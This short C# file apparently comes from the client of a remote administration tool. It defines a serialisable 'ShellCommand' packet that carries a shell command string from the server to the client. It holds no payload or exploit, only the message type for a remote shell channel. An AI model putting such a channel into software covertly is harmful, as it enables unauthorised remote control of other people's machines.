using ProtoBuf;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class ShellCommand : IPacket
    {
        public ShellCommand()
        {
        }

        public ShellCommand(string command)
        {
            Command = command;
        }

        [ProtoMember(1)]
        public string Command { get; set; }

        public void Execute(Client client)
        {
            client.Send<ShellCommand>(this);
        }
    }
}